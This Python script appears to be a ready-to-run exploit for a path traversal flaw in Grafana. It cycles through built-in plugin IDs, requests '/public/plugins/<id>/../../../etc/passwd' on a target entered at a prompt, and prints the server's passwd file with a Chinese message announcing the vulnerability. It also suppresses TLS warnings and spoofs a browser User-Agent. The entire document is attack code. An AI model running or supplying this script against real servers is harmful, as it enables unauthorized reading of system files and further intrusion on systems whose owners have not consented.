import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings()



def run(target):
    plugin_ids = ["alertlist"," annolist"," barchart"," bargauge"," candlestick"," cloudwatch"," dashlist"," elasticsearch"," gauge"," geomap"," gettingstarted"," grafana-azure-monitor-datasource"," graph"," heatmap"," histogram"," influxdb"," jaeger"," logs"," loki"," mssql"," mysql"," news"," nodeGraph"," opentsdb"," piechart"," pluginlist"," postgres"," prometheus"," stackdriver"," stat"," state-timeline"," status-history"," table"," table-old"," tempo"," testdata"," text"," timeseries"," welcome"," zipkin"]
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"}
    for i in plugin_ids:
        url = f"{target}/public/plugins/{i}/../../../../../../../../../../../../../../../../../../../etc/passwd"
        try:
            res = requests.get(url, headers=headers ,timeout=5)
            if res.status_code == 200 and res.text:
                print(target+"存在漏洞,漏洞URL："+url)
                print(res.text)
                return True
        except:
            return False
    return False

if __name__ == "__main__":
    target = input("Target >>> ")
    run(target)